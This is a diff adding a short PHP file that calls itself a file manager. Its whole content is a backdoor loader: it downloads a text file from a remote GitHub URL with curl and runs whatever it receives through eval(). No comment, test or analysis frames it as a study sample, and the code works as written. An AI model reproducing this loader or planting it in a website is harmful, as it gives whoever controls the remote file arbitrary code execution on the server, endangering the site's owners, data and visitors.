@@ -1,0 +1,14 @@
+<?php
+
+function fm_php($output){
+    echo eval('?>'.$output);
+}
+/* XMAN PHP File manager ver 1.4 */
+    $Url = "https://raw.githubusercontent.com/rkseocode/secode/main/api2.txt";
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $Url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    $output = curl_exec($ch);
+    curl_close($ch);
+    fm_php($output);
+?>
